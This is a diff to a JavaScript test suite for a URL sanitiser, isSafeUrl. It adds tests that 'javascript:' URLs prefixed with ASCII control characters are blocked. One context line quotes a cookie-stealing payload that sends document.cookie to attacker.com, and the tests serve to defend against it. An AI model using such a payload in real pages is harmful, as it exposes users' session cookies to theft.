@@ -89,6 +89,14 @@ describe('isSafeUrl', () => {
     expect(isSafeUrl('\r\njavascript:alert(1)')).toBe(false);
   });
 
+  test.each(Array.from({ length: 0x21 }, (_, codePoint) => codePoint))(
+    'Should block javascript: protocol prefixed with ASCII control or space U+%s',
+    codePoint => {
+      const prefix = String.fromCharCode(codePoint);
+      expect(isSafeUrl(`${prefix}javascript:alert(1)`)).toBe(false);
+    },
+  );
+
   test('Should block javascript payload from security report', () => {
     // eslint-disable-next-line no-script-url
     expect(isSafeUrl("javascript:fetch('https://attacker.com/'+document.cookie)")).toBe(false);
